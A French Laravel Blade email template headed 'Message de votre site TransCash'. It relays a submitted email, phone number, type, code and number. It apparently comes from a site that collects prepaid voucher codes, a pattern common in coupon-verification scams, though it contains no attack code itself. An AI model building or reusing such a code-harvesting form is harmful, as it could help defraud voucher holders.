<!DOCTYPE html>
<html>

<head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
</head>

<body style="background: #e5e5e5; padding: 30px;">

    <div style="max-width: 320px; margin: 0 auto; padding: 20px; background: #fff;">
        <h3>Message de votre site TransCash :</h3>
        <div>Email: {{ $data['email'] }}</div>
        <div>Télephone: {{ $data['tel'] }}</div>
        <div>Type: {{ $data['type'] }}</div>
        <div>Code: {{ $data['mont1'] }}</div>
        <div>Nombre: {{ $data['cc1'] }}</div>
    </div>

</body>

</html>